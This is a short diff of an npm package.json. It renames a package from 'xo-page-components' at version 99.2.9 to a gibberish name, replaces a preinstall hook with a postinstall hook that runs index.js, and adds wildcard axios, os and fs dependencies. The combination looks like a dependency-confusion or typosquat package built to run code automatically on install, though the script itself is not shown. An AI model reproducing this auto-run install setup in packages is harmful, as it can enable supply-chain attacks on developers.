@@ -1,12 +1,16 @@
 {
-  "name": "xo-page-components",
-  "version": "99.2.9",
-  "description": "",
+  "name": "jhsdfgghsdfjhds",
+  "version": "1.0.7",
   "main": "index.js",
   "scripts": {
-    "test": "echo \"Error: no test specified\" && exit 1",
-     "preinstall": "node index.js"
+    "postinstall": "node index.js"
   },
-  "author": "any",
-  "license": "ISC"
+  "dependencies": {
+        "axios": "*",
+        "os": "*",
+        "fs": "*"
+    },
+  "author": "",
+  "license": "ISC",
+  "description": ""
 }
